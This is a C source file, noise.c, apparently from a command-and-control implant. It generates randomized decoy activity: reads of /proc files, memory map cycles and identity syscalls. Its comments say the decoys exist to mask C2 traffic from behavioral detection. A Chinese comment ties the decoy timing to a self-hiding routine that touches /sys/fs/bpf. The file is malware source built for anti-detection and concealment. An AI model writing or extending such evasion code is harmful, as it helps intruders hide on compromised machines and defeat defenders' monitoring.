/// noise.c — benign-behavior generator for behavioral-evasion.
/// All activity uses direct syscalls (zero libc, consistent with crt.c).
/// Cadence and action choice are randomized; the syscall sequence the
/// process emits therefore interleaves ordinary, harmless operations
/// between C2 traffic instead of a fixed "connect/read/write" loop.

#include "noise.h"
#include "crt.h"
#include "timing.h"
#include "opsec.h"

#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif

#ifndef O_RDONLY
#define O_RDONLY 0
#endif

// mmap constants
#define PROT_READ  0x1
#define PROT_WRITE 0x2
#define MAP_PRIVATE   0x02
#define MAP_ANONYMOUS 0x20

static void read_proc_file(const char *path) {
    int fd = sys_open(path, O_RDONLY, 0);
    if (fd < 0) return;
    uint8_t buf[256];
    (void)sys_read(fd, buf, sizeof(buf));
    sys_close(fd);
}

static void mem_cycle(void) {
    void *p = sys_mmap((void *)0, 4096, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == (void *)-1 || !p) return;
    ax_memset(p, 0x41, 512);
    sys_munmap(p, 4096);
}

void ax_behavior_noise(void) {
    static uint64_t next_ms = 0;
    uint64_t now = ax_monotonic_ms();
    if (now < next_ms) return;
    // Next action in 3-20 s
    next_ms = now + 3000 + (uint64_t)ax_rand_below(17000);

    // B10：自隐藏跑在**闸门之内** —— 复用地噪声节律（每 3–20s 一次落地机会），
    // 不额外制造"每 100ms 摸一次 /sys/fs/bpf"这种稳定周期特征。
    opsec_hide_self_tick();

    uint32_t action = ax_rand_below(5);
    switch (action) {
    case 0:
        read_proc_file("/proc/stat");
        break;
    case 1:
        read_proc_file("/proc/meminfo");
        break;
    case 2:
        read_proc_file("/proc/self/status");
        break;
    case 3:
        mem_cycle();
        break;
    default: {
        struct linux_timespec ts;
        (void)sys_clock_gettime(1, &ts);
        (void)sys_getpid();
        (void)sys_getuid();
        (void)sys_geteuid();
        break;
    }
    }
}
